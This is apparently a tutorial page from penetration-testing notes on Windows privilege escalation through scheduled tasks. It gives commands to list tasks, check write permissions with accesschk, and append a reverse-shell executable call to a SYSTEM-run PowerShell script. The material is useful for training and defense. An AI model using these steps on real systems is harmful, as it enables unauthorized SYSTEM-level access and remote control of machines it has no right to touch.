# Scheduled Tasks

Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.

List all scheduled tasks your user can see:

```
schtasks /query /fo LIST /v
```

In PowerShell:

```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

in this example we find a powershell script that will clean up our old dev logs every minute.

![](<../../../.gitbook/assets/image (153).png>)

This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:

```
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

![](<../../../.gitbook/assets/image (152) (1).png>)

It appears we have the ability to write to this file

Backup the script:

```
copy C:\DevTools\CleanUp.ps1 C:\Temp\
```

start a listener on your side, create a reverse shell and Use echo to append a call to our reverse shell executable to the end of the script:

```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

Wait for the scheduled task to run (it should run every minute) to complete the exploit.

![](<../../../.gitbook/assets/image (149).png>)
